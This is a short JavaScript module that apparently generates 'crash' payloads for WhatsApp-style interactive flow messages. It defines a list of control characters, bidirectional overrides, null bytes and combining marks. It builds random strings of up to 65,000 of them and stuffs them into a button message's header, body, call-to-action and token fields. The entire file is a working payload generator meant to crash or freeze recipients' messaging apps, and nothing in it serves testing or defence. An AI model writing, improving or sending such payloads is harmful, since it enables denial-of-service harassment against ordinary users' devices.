
const crashCharacters = [
    "\u200e", "\u200f", "\u202e", "\u0000", "\u0001", "\u0002", "\u0003", "\u0004", "\u0005", "\u0006", "\u0007", "\u0008", "\u000B", "\u000C", "\u000E", "\u000F",
    "\u0010", "\u0011", "\u0012", "\u0013", "\u0014", "\u0015", "\u0016", "\u0017", "\u0018", "\u0019", "\u001A", "\u001B", "\u001C", "\u001D", "\u001E", "\u001F",
    "ြ", "ཹ", "҉", "⃟", "✧", "🔥", "🚩", "🗑️", "❌", "✅", "⚠️", "📣", "👤", "🔑", "⭐", "╭", "──────", "「", "」", "──────", "╮", "│➻", "╰", "───────────────────────", "╯"
];

const getSuperPayload = (size = 65000) => {
    let payload = "";
    for (let i = 0; i < size; i++) {
        payload += crashCharacters[Math.floor(Math.random() * crashCharacters.length)];
    }
    return payload;
};

const getButtonPayload = () => {
    return JSON.stringify({
        header: getSuperPayload(1000),
        body: getSuperPayload(1000),
        flow_action: 'navigate',
        flow_action_payload: {
            screen: 'FORM_SCREEN'
        },
        flow_cta: getSuperPayload(500),
        flow_id: '1169834181134583',
        flow_message_version: '3',
        flow_token: getSuperPayload(500),
    });
};

module.exports = { getSuperPayload, getButtonPayload, crashCharacters };
